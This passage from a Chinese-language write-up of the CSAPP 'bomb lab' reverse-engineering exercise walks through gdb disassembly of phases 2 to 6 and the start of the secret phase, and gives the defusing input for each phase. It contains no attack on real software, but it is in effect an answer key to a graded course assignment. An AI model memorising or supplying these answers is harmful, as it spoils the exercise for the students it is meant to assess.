$0x1,(%rsp)<br>0x0000000000400f0e &lt;+18&gt;:    je     0x400f30 &lt;phase_2+52&gt;<br>0x0000000000400f10 &lt;+20&gt;:    call   0x40143a &lt;explode_bomb&gt;<br>0x0000000000400f15 &lt;+25&gt;:    jmp    0x400f30 &lt;phase_2+52&gt;<br>0x0000000000400f17 &lt;+27&gt;:    mov    -0x4(%rbx),%eax<br>0x0000000000400f1a &lt;+30&gt;:    add    %eax,%eax<br>0x0000000000400f1c &lt;+32&gt;:    cmp    %eax,(%rbx)<br>0x0000000000400f1e &lt;+34&gt;:    je     0x400f25 &lt;phase_2+41&gt;<br>0x0000000000400f20 &lt;+36&gt;:    call   0x40143a &lt;explode_bomb&gt;<br>0x0000000000400f25 &lt;+41&gt;:    add    $0x4,%rbx<br>0x0000000000400f29 &lt;+45&gt;:    cmp    %rbp,%rbx<br>0x0000000000400f2c &lt;+48&gt;:    jne    0x400f17 &lt;phase_2+27&gt;<br>0x0000000000400f2e &lt;+50&gt;:    jmp    0x400f3c &lt;phase_2+64&gt;<br>0x0000000000400f30 &lt;+52&gt;:    lea    0x4(%rsp),%rbx<br>0x0000000000400f35 &lt;+57&gt;:    lea    0x18(%rsp),%rbp<br>0x0000000000400f3a &lt;+62&gt;:    jmp    0x400f17 &lt;phase_2+27&gt;<br>0x0000000000400f3c &lt;+64&gt;:    add    $0x28,%rsp<br>0x0000000000400f40 &lt;+68&gt;:    pop    %rbx<br>0x0000000000400f41 &lt;+69&gt;:    pop    %rbp<br>0x0000000000400f42 &lt;+70&gt;:    ret<br></code></pre></td></tr></table></figure>

<p>可以看出，跳转到<code>phase_2+52</code>而不触发炸弹的条件是：输入6个数字，第一个数字是1，随后指针后移，后一个数字是前一个的2倍。</p>
<p>输入序列<strong>1 2 4 8 16 32</strong>符合要求。</p>
<h3 id="Phase-3"><a href="#Phase-3" class="headerlink" title="Phase 3"></a>Phase 3</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs assembly">0x0000000000400f43 &lt;+0&gt;:     sub    $0x18,%rsp<br>0x0000000000400f47 &lt;+4&gt;:     lea    0xc(%rsp),%rcx<br>0x0000000000400f4c &lt;+9&gt;:     lea    0x8(%rsp),%rdx<br>0x0000000000400f51 &lt;+14&gt;:    mov    $0x4025cf,%esi<br>0x0000000000400f56 &lt;+19&gt;:    mov    $0x0,%eax<br>0x0000000000400f5b &lt;+24&gt;:    call   0x400bf0 &lt;__isoc99_sscanf@plt&gt;<br>0x0000000000400f60 &lt;+29&gt;:    cmp    $0x1,%eax<br>0x0000000000400f63 &lt;+32&gt;:    jg     0x400f6a &lt;phase_3+39&gt;<br>0x0000000000400f65 &lt;+34&gt;:    call   0x40143a &lt;explode_bomb&gt;<br>0x0000000000400f6a &lt;+39&gt;:    cmpl   $0x7,0x8(%rsp)<br>0x0000000000400f6f &lt;+44&gt;:    ja     0x400fad &lt;phase_3+106&gt;<br>0x0000000000400f71 &lt;+46&gt;:    mov    0x8(%rsp),%eax<br>0x0000000000400f75 &lt;+50&gt;:    jmp    *0x402470(,%rax,8)<br>0x0000000000400f7c &lt;+57&gt;:    mov    $0xcf,%eax<br>0x0000000000400f81 &lt;+62&gt;:    jmp    0x400fbe &lt;phase_3+123&gt;<br>0x0000000000400f83 &lt;+64&gt;:    mov    $0x2c3,%eax<br>0x0000000000400f88 &lt;+69&gt;:    jmp    0x400fbe &lt;phase_3+123&gt;<br>0x0000000000400f8a &lt;+71&gt;:    mov    $0x100,%eax<br>0x0000000000400f8f &lt;+76&gt;:    jmp    0x400fbe &lt;phase_3+123&gt;<br>0x0000000000400f91 &lt;+78&gt;:    mov    $0x185,%eax<br>0x0000000000400f96 &lt;+83&gt;:    jmp    0x400fbe &lt;phase_3+123&gt;<br>0x0000000000400f98 &lt;+85&gt;:    mov    $0xce,%eax<br>0x0000000000400f9d &lt;+90&gt;:    jmp    0x400fbe &lt;phase_3+123&gt;<br>0x0000000000400f9f &lt;+92&gt;:    mov    $0x2aa,%eax<br>0x0000000000400fa4 &lt;+97&gt;:    jmp    0x400fbe &lt;phase_3+123&gt;<br>0x0000000000400fa6 &lt;+99&gt;:    mov    $0x147,%eax<br>0x0000000000400fab &lt;+104&gt;:   jmp    0x400fbe &lt;phase_3+123&gt;<br>0x0000000000400fad &lt;+106&gt;:   call   0x40143a &lt;explode_bomb&gt;<br>0x0000000000400fb2 &lt;+111&gt;:   mov    $0x0,%eax<br>0x0000000000400fb7 &lt;+116&gt;:   jmp    0x400fbe &lt;phase_3+123&gt;<br>0x0000000000400fb9 &lt;+118&gt;:   mov    $0x137,%eax<br>0x0000000000400fbe &lt;+123&gt;:   cmp    0xc(%rsp),%eax<br>0x0000000000400fc2 &lt;+127&gt;:   je     0x400fc9 &lt;phase_3+134&gt;<br>0x0000000000400fc4 &lt;+129&gt;:   call   0x40143a &lt;explode_bomb&gt;<br>0x0000000000400fc9 &lt;+134&gt;:   add    $0x18,%rsp<br>0x0000000000400fcd &lt;+138&gt;:   ret<br></code></pre></td></tr></table></figure>

<p>要求至少输入2个数，且第一个数不大于7，然后根据第一个数跳转，跳转表位于<code>0x402470</code>。</p>
<p>向%eax写入的新值需要与0xc(%rsp)即第二个数相等。跳转表的第一项(对应第一个数为0)必然存在，可获得该项的跳转地址：</p>
<p><img src="/CSAPP3e_WP/image-20240125104109016-172450351282313.png" style="zoom: 67%;" align="left"></p>



<p>输入<strong>0 207</strong>符合要求。</p>
<h3 id="Phase-4"><a href="#Phase-4" class="headerlink" title="Phase 4"></a>Phase 4</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs assembly">0x000000000040100c &lt;+0&gt;:     sub    $0x18,%rsp<br>0x0000000000401010 &lt;+4&gt;:     lea    0xc(%rsp),%rcx<br>0x0000000000401015 &lt;+9&gt;:     lea    0x8(%rsp),%rdx<br>0x000000000040101a &lt;+14&gt;:    mov    $0x4025cf,%esi<br>0x000000000040101f &lt;+19&gt;:    mov    $0x0,%eax<br>0x0000000000401024 &lt;+24&gt;:    call   0x400bf0 &lt;__isoc99_sscanf@plt&gt;<br>0x0000000000401029 &lt;+29&gt;:    cmp    $0x2,%eax<br>0x000000000040102c &lt;+32&gt;:    jne    0x401035 &lt;phase_4+41&gt;<br>0x000000000040102e &lt;+34&gt;:    cmpl   $0xe,0x8(%rsp)<br>0x0000000000401033 &lt;+39&gt;:    jbe    0x40103a &lt;phase_4+46&gt;<br>0x0000000000401035 &lt;+41&gt;:    call   0x40143a &lt;explode_bomb&gt;<br>0x000000000040103a &lt;+46&gt;:    mov    $0xe,%edx<br>0x000000000040103f &lt;+51&gt;:    mov    $0x0,%esi<br>0x0000000000401044 &lt;+56&gt;:    mov    0x8(%rsp),%edi<br>0x0000000000401048 &lt;+60&gt;:    call   0x400fce &lt;func4&gt;<br>0x000000000040104d &lt;+65&gt;:    test   %eax,%eax<br>0x000000000040104f &lt;+67&gt;:    jne    0x401058 &lt;phase_4+76&gt;<br>0x0000000000401051 &lt;+69&gt;:    cmpl   $0x0,0xc(%rsp)<br>0x0000000000401056 &lt;+74&gt;:    je     0x40105d &lt;phase_4+81&gt;<br>0x0000000000401058 &lt;+76&gt;:    call   0x40143a &lt;explode_bomb&gt;<br>0x000000000040105d &lt;+81&gt;:    add    $0x18,%rsp<br>0x0000000000401061 &lt;+85&gt;:    ret<br></code></pre></td></tr></table></figure>

<p>输入2个数字，第一个数字不大于14并且作为func4的第一个参数(%edi)，func4的第二个参数(%esi)为0，第三个参数(%edx)为14。</p>
<p>不触发炸弹要求func4返回0，并且输入的第二个数字为0。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs assembly">0x0000000000400fce &lt;+0&gt;:     sub    $0x8,%rsp<br>0x0000000000400fd2 &lt;+4&gt;:     mov    %edx,%eax<br>0x0000000000400fd4 &lt;+6&gt;:     sub    %esi,%eax<br>0x0000000000400fd6 &lt;+8&gt;:     mov    %eax,%ecx<br>0x0000000000400fd8 &lt;+10&gt;:    shr    $0x1f,%ecx<br>0x0000000000400fdb &lt;+13&gt;:    add    %ecx,%eax<br>0x0000000000400fdd &lt;+15&gt;:    sar    %eax<br>0x0000000000400fdf &lt;+17&gt;:    lea    (%rax,%rsi,1),%ecx<br>0x0000000000400fe2 &lt;+20&gt;:    cmp    %edi,%ecx<br>0x0000000000400fe4 &lt;+22&gt;:    jle    0x400ff2 &lt;func4+36&gt;<br>0x0000000000400fe6 &lt;+24&gt;:    lea    -0x1(%rcx),%edx<br>0x0000000000400fe9 &lt;+27&gt;:    call   0x400fce &lt;func4&gt;<br>0x0000000000400fee &lt;+32&gt;:    add    %eax,%eax<br>0x0000000000400ff0 &lt;+34&gt;:    jmp    0x401007 &lt;func4+57&gt;<br>0x0000000000400ff2 &lt;+36&gt;:    mov    $0x0,%eax<br>0x0000000000400ff7 &lt;+41&gt;:    cmp    %edi,%ecx<br>0x0000000000400ff9 &lt;+43&gt;:    jge    0x401007 &lt;func4+57&gt;<br>0x0000000000400ffb &lt;+45&gt;:    lea    0x1(%rcx),%esi<br>0x0000000000400ffe &lt;+48&gt;:    call   0x400fce &lt;func4&gt;<br>0x0000000000401003 &lt;+53&gt;:    lea    0x1(%rax,%rax,1),%eax<br>0x0000000000401007 &lt;+57&gt;:    add    $0x8,%rsp<br>0x000000000040100b &lt;+61&gt;:    ret<br></code></pre></td></tr></table></figure>

<p>要求func4的返回值为0，需要执行<code>0x400ff2</code>处的程序(%ecx&lt;&#x3D;%edi的分支)，该程序在%ecx&gt;&#x3D;%edi时返回0。因此需要%ecx与%edi相等。%ecx&#x3D;%rax+%rsi，之前%eax右移1位，即%ecx&#x3D;%eax&#x2F;2&#x3D;%edx&#x2F;2。%edi为输入的第一个数，取为7即可。</p>
<p>一个可行的输入为<strong>7 0</strong>。</p>
<h3 id="Phase-5"><a href="#Phase-5" class="headerlink" title="Phase 5"></a>Phase 5</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs assembly">0x0000000000401062 &lt;+0&gt;:     push   %rbx<br>0x0000000000401063 &lt;+1&gt;:     sub    $0x20,%rsp<br>0x0000000000401067 &lt;+5&gt;:     mov    %rdi,%rbx<br>0x000000000040106a &lt;+8&gt;:     mov    %fs:0x28,%rax<br>0x0000000000401073 &lt;+17&gt;:    mov    %rax,0x18(%rsp)<br>0x0000000000401078 &lt;+22&gt;:    xor    %eax,%eax<br>0x000000000040107a &lt;+24&gt;:    call   0x40131b &lt;string_length&gt;<br>0x000000000040107f &lt;+29&gt;:    cmp    $0x6,%eax<br>0x0000000000401082 &lt;+32&gt;:    je     0x4010d2 &lt;phase_5+112&gt;<br>0x0000000000401084 &lt;+34&gt;:    call   0x40143a &lt;explode_bomb&gt;<br>0x0000000000401089 &lt;+39&gt;:    jmp    0x4010d2 &lt;phase_5+112&gt;<br>0x000000000040108b &lt;+41&gt;:    movzbl (%rbx,%rax,1),%ecx<br>0x000000000040108f &lt;+45&gt;:    mov    %cl,(%rsp)<br>0x0000000000401092 &lt;+48&gt;:    mov    (%rsp),%rdx<br>0x0000000000401096 &lt;+52&gt;:    and    $0xf,%edx<br>0x0000000000401099 &lt;+55&gt;:    movzbl 0x4024b0(%rdx),%edx<br>0x00000000004010a0 &lt;+62&gt;:    mov    %dl,0x10(%rsp,%rax,1)<br>0x00000000004010a4 &lt;+66&gt;:    add    $0x1,%rax<br>0x00000000004010a8 &lt;+70&gt;:    cmp    $0x6,%rax<br>0x00000000004010ac &lt;+74&gt;:    jne    0x40108b &lt;phase_5+41&gt;<br>0x00000000004010ae &lt;+76&gt;:    movb   $0x0,0x16(%rsp)<br>0x00000000004010b3 &lt;+81&gt;:    mov    $0x40245e,%esi<br>0x00000000004010b8 &lt;+86&gt;:    lea    0x10(%rsp),%rdi<br>0x00000000004010bd &lt;+91&gt;:    call   0x401338 &lt;strings_not_equal&gt;<br>0x00000000004010c2 &lt;+96&gt;:    test   %eax,%eax<br>0x00000000004010c4 &lt;+98&gt;:    je     0x4010d9 &lt;phase_5+119&gt;<br>0x00000000004010c6 &lt;+100&gt;:   call   0x40143a &lt;explode_bomb&gt;<br>0x00000000004010cb &lt;+105&gt;:   nopl   0x0(%rax,%rax,1)<br>0x00000000004010d0 &lt;+110&gt;:   jmp    0x4010d9 &lt;phase_5+119&gt;<br>0x00000000004010d2 &lt;+112&gt;:   mov    $0x0,%eax<br>0x00000000004010d7 &lt;+117&gt;:   jmp    0x40108b &lt;phase_5+41&gt;<br>0x00000000004010d9 &lt;+119&gt;:   mov    0x18(%rsp),%rax<br>0x00000000004010de &lt;+124&gt;:   xor    %fs:0x28,%rax<br>0x00000000004010e7 &lt;+133&gt;:   je     0x4010ee &lt;phase_5+140&gt;<br>0x00000000004010e9 &lt;+135&gt;:   call   0x400b30 &lt;__stack_chk_fail@plt&gt;<br>0x00000000004010ee &lt;+140&gt;:   add    $0x20,%rsp<br>0x00000000004010f2 &lt;+144&gt;:   pop    %rbx<br>0x00000000004010f3 &lt;+145&gt;:   ret<br></code></pre></td></tr></table></figure>

<p>要求输入字符串的长度为6，然后对字符串进行处理：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs assembly">and		$0xf,%edx				# 输入字符对16取余<br>movzbl	0x4024b0(%rdx),%edx		# 读取0x4024b0+%rdx处的字符<br>mov		$dl,0x10(%rsp,%rax,1)	# 保存处理完成的字符<br></code></pre></td></tr></table></figure>

<p>查看<code>0x4024b0</code>处的数据，取前16个字符为<code>maduiersnfoyvbyl</code>：</p>
<p><img src="/CSAPP3e_WP/image-20240125114931654-172450352160215.png" style="zoom: 67%;" align="left"></p>



<p>查看进行比较的字符串，位于<code>0x40245e</code>：</p>
<p><img src="/CSAPP3e_WP/image-20240125115105490-172450352338817.png" align="left" style="zoom:67%;"></p>



<p>因此应该选取<code>0x4024b0</code>处偏移量依次为9, 15, 14, 5, 6, 7处的字符。偏移量由输入字符的ASCII码对16取余得到，不妨取输入字符的ASCII码为0x69,0x6f,0x6d,0x65,0x66,0x67。</p>
<p>一个可行的输入为<strong>ionefg</strong>。</p>
<h3 id="Phase-6"><a href="#Phase-6" class="headerlink" title="Phase 6"></a>Phase 6</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><code class="hljs assembly">0x00000000004010f4 &lt;+0&gt;:     push   %r14<br>0x00000000004010f6 &lt;+2&gt;:     push   %r13<br>0x00000000004010f8 &lt;+4&gt;:     push   %r12<br>0x00000000004010fa &lt;+6&gt;:     push   %rbp<br>0x00000000004010fb &lt;+7&gt;:     push   %rbx<br>0x00000000004010fc &lt;+8&gt;:     sub    $0x50,%rsp<br>0x0000000000401100 &lt;+12&gt;:    mov    %rsp,%r13<br>0x0000000000401103 &lt;+15&gt;:    mov    %rsp,%rsi<br>0x0000000000401106 &lt;+18&gt;:    call   0x40145c &lt;read_six_numbers&gt;<br>0x000000000040110b &lt;+23&gt;:    mov    %rsp,%r14<br>0x000000000040110e &lt;+26&gt;:    mov    $0x0,%r12d<br>0x0000000000401114 &lt;+32&gt;:    mov    %r13,%rbp<br>0x0000000000401117 &lt;+35&gt;:    mov    0x0(%r13),%eax<br>0x000000000040111b &lt;+39&gt;:    sub    $0x1,%eax<br>0x000000000040111e &lt;+42&gt;:    cmp    $0x5,%eax<br>0x0000000000401121 &lt;+45&gt;:    jbe    0x401128 &lt;phase_6+52&gt;<br>0x0000000000401123 &lt;+47&gt;:    call   0x40143a &lt;explode_bomb&gt;<br>0x0000000000401128 &lt;+52&gt;:    add    $0x1,%r12d<br>0x000000000040112c &lt;+56&gt;:    cmp    $0x6,%r12d<br>0x0000000000401130 &lt;+60&gt;:    je     0x401153 &lt;phase_6+95&gt;<br>0x0000000000401132 &lt;+62&gt;:    mov    %r12d,%ebx<br>0x0000000000401135 &lt;+65&gt;:    movslq %ebx,%rax<br>0x0000000000401138 &lt;+68&gt;:    mov    (%rsp,%rax,4),%eax<br>0x000000000040113b &lt;+71&gt;:    cmp    %eax,0x0(%rbp)<br>0x000000000040113e &lt;+74&gt;:    jne    0x401145 &lt;phase_6+81&gt;<br>0x0000000000401140 &lt;+76&gt;:    call   0x40143a &lt;explode_bomb&gt;<br>0x0000000000401145 &lt;+81&gt;:    add    $0x1,%ebx<br>0x0000000000401148 &lt;+84&gt;:    cmp    $0x5,%ebx<br>0x000000000040114b &lt;+87&gt;:    jle    0x401135 &lt;phase_6+65&gt;<br>0x000000000040114d &lt;+89&gt;:    add    $0x4,%r13<br>0x0000000000401151 &lt;+93&gt;:    jmp    0x401114 &lt;phase_6+32&gt;<br><br>0x0000000000401153 &lt;+95&gt;:    lea    0x18(%rsp),%rsi<br>0x0000000000401158 &lt;+100&gt;:   mov    %r14,%rax<br>0x000000000040115b &lt;+103&gt;:   mov    $0x7,%ecx<br>0x0000000000401160 &lt;+108&gt;:   mov    %ecx,%edx<br>0x0000000000401162 &lt;+110&gt;:   sub    (%rax),%edx<br>0x0000000000401164 &lt;+112&gt;:   mov    %edx,(%rax)<br>0x0000000000401166 &lt;+114&gt;:   add    $0x4,%rax<br>0x000000000040116a &lt;+118&gt;:   cmp    %rsi,%rax<br>0x000000000040116d &lt;+121&gt;:   jne    0x401160 &lt;phase_6+108&gt;<br>0x000000000040116f &lt;+123&gt;:   mov    $0x0,%esi<br>0x0000000000401174 &lt;+128&gt;:   jmp    0x401197 &lt;phase_6+163&gt;<br><br>0x0000000000401176 &lt;+130&gt;:   mov    0x8(%rdx),%rdx<br>0x000000000040117a &lt;+134&gt;:   add    $0x1,%eax<br>0x000000000040117d &lt;+137&gt;:   cmp    %ecx,%eax<br>0x000000000040117f &lt;+139&gt;:   jne    0x401176 &lt;phase_6+130&gt;<br>0x0000000000401181 &lt;+141&gt;:   jmp    0x401188 &lt;phase_6+148&gt;<br>0x0000000000401183 &lt;+143&gt;:   mov    $0x6032d0,%edx<br>0x0000000000401188 &lt;+148&gt;:   mov    %rdx,0x20(%rsp,%rsi,2)<br>0x000000000040118d &lt;+153&gt;:   add    $0x4,%rsi<br>0x0000000000401191 &lt;+157&gt;:   cmp    $0x18,%rsi<br>0x0000000000401195 &lt;+161&gt;:   je     0x4011ab &lt;phase_6+183&gt;<br>0x0000000000401197 &lt;+163&gt;:   mov    (%rsp,%rsi,1),%ecx<br>0x000000000040119a &lt;+166&gt;:   cmp    $0x1,%ecx<br>0x000000000040119d &lt;+169&gt;:   jle    0x401183 &lt;phase_6+143&gt;<br>0x000000000040119f &lt;+171&gt;:   mov    $0x1,%eax<br>0x00000000004011a4 &lt;+176&gt;:   mov    $0x6032d0,%edx<br>0x00000000004011a9 &lt;+181&gt;:   jmp    0x401176 &lt;phase_6+130&gt;<br><br>0x00000000004011ab &lt;+183&gt;:   mov    0x20(%rsp),%rbx<br>0x00000000004011b0 &lt;+188&gt;:   lea    0x28(%rsp),%rax<br>0x00000000004011b5 &lt;+193&gt;:   lea    0x50(%rsp),%rsi<br>0x00000000004011ba &lt;+198&gt;:   mov    %rbx,%rcx<br>0x00000000004011bd &lt;+201&gt;:   mov    (%rax),%rdx<br>0x00000000004011c0 &lt;+204&gt;:   mov    %rdx,0x8(%rcx)<br>0x00000000004011c4 &lt;+208&gt;:   add    $0x8,%rax<br>0x00000000004011c8 &lt;+212&gt;:   cmp    %rsi,%rax<br>0x00000000004011cb &lt;+215&gt;:   je     0x4011d2 &lt;phase_6+222&gt;<br>0x00000000004011cd &lt;+217&gt;:   mov    %rdx,%rcx<br>0x00000000004011d0 &lt;+220&gt;:   jmp    0x4011bd &lt;phase_6+201&gt;<br>0x00000000004011d2 &lt;+222&gt;:   movq   $0x0,0x8(%rdx)<br>0x00000000004011da &lt;+230&gt;:   mov    $0x5,%ebp<br>0x00000000004011df &lt;+235&gt;:   mov    0x8(%rbx),%rax<br>0x00000000004011e3 &lt;+239&gt;:   mov    (%rax),%eax<br>0x00000000004011e5 &lt;+241&gt;:   cmp    %eax,(%rbx)<br>0x00000000004011e7 &lt;+243&gt;:   jge    0x4011ee &lt;phase_6+250&gt;<br>0x00000000004011e9 &lt;+245&gt;:   call   0x40143a &lt;explode_bomb&gt;<br>0x00000000004011ee &lt;+250&gt;:   mov    0x8(%rbx),%rbx<br>0x00000000004011f2 &lt;+254&gt;:   sub    $0x1,%ebp<br>0x00000000004011f5 &lt;+257&gt;:   jne    0x4011df &lt;phase_6+235&gt;<br>0x00000000004011f7 &lt;+259&gt;:   add    $0x50,%rsp<br>0x00000000004011fb &lt;+263&gt;:   pop    %rbx<br>0x00000000004011fc &lt;+264&gt;:   pop    %rbp<br>0x00000000004011fd &lt;+265&gt;:   pop    %r12<br>0x00000000004011ff &lt;+267&gt;:   pop    %r13<br>0x0000000000401201 &lt;+269&gt;:   pop    %r14<br>0x0000000000401203 &lt;+271&gt;:   ret<br></code></pre></td></tr></table></figure>

<p>输入为6个数字，循环跳出到<code>0x401153</code>。由<code>0x4a111b</code>, <code>0x4a111e</code>, <code>0x4a1121</code>处可知第一个数字不小于1且不大于6，将第一个数字存放于%eax。</p>
<p><code>0x401138</code>处开始处理剩下的数字，要求与第一个数字不相等。结合<code>0x401151</code>处的<code>jmp 0x401114</code>，每个数字的范围都在1至6之间，且两两不相等。输入结束后跳转到<code>0x401153</code>，此处将每个数字i变为7-i，全部转换结束后执行<code>0x40116f</code>处语句。</p>
<p>注意到内存地址<code>0x6032d0</code>，打印该处附近的值。</p>
<p><img src="/CSAPP3e_WP/image-20240125154321644-17245034799789.png" style="zoom: 67%;" align="left"></p>















<p>该处可能为链表：</p>
<table>
<thead>
<tr>
<th>node</th>
<th>data(BE)</th>
<th>next node</th>
</tr>
</thead>
<tbody><tr>
<td>node1</td>
<td>00 00 00 01 00 00 01 4c</td>
<td>node2</td>
</tr>
<tr>
<td>node2</td>
<td>00 00 00 02 00 00 00 a8</td>
<td>node3</td>
</tr>
<tr>
<td>node3</td>
<td>00 00 00 03 00 00 03 9c</td>
<td>node4</td>
</tr>
<tr>
<td>node4</td>
<td>00 00 00 04 00 00 02 b3</td>
<td>node5</td>
</tr>
<tr>
<td>node5</td>
<td>00 00 00 05 00 00 01 dd</td>
<td>node6</td>
</tr>
<tr>
<td>node6</td>
<td>00 00 00 06 00 00 01 bb</td>
<td>null</td>
</tr>
</tbody></table>
<p><code>0x4011a9</code>处的指令跳转回到<code>0x401176</code>，两行之间的指令对%edx, %rdx进行操作，%rsi循环累加并与0x18比较，此处循环结束后跳转到<code>0x4011ab</code>。向后定位到<code>0x4011e7</code>，要避免触发炸弹，需要%eax&#x3D;0x8(%rbx)&gt;&#x3D;(%rbx)，节点顺序7-i的排序满足各节点的数据递减，%eax取低32位，因此数据排序是3,4,5,6,1,2，输入序列是<strong>4 3 2 1 6 5</strong>。</p>
<h3 id="Secret-Phase"><a href="#Secret-Phase" class="headerlink" title="Secret Phase"></a>Secret Phase</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs assembly">0x0000000000401242 &lt;+0&gt;:     push   %rbx<br>0x0000000000401243 &lt;+1&gt;:     call   0x40149e &lt;read_line&gt;<br>0x0000000000401248 &lt;+6&gt;:     mov    $0xa,%edx<br>0x000000000040124d &lt;+11&gt;:    mov    $0x0,%esi<br>0x0000000000401252 &lt;+16&gt;:    mov    %rax,%rdi<br>0x0000000000401255 &lt;+19&gt;:    call   0x400bd0 &lt;strtol@plt&gt;<br>0x000000000040125a &lt;+24&gt;:    mov    %rax,%rbx<br>0x000000000040125d &lt;+27&gt;:    lea    -0x1(%rax),%eax<br>0x0000000000401260 &lt;+30&gt;:    cmp    $0x3e8,%eax<br>0x0000000000401265 &lt;+35&gt;:    jbe    0x40126c &lt;secret_phase+42&gt;<br>0x0000000000401267 &lt;+37&gt;:    call   0x40143a &lt;explode_bomb&gt;<br>0x000000000040126c &lt;+42&gt;:    mov    %ebx,%esi<br>0x000000000040126e &lt;+44&gt;:    mov    $0x6030f0,%edi<br>0x0000000000401273 &lt;+49&gt;:    call   0x401204 &lt;fun7&gt;<br>0x0000000000401278 &lt;+54&gt;:    cmp    $0x2,%eax<br>0x000000000040127b &lt;+57&gt;:    je     0x401282 &lt;secret_phase+64&gt;<br>0x000000000040127d &lt;+59&gt;:    call   0x40143a &lt;explode_bomb&gt;<br>0x0000000000401282 &lt;+64&gt;:    mov    $0x402438,%edi<br>0x0000000000401287 &lt;+69&gt;:    call   0x400b10 &lt;puts@plt&gt;<br>0x000000000040128c &lt;+74&gt;:    call   0x4015c4 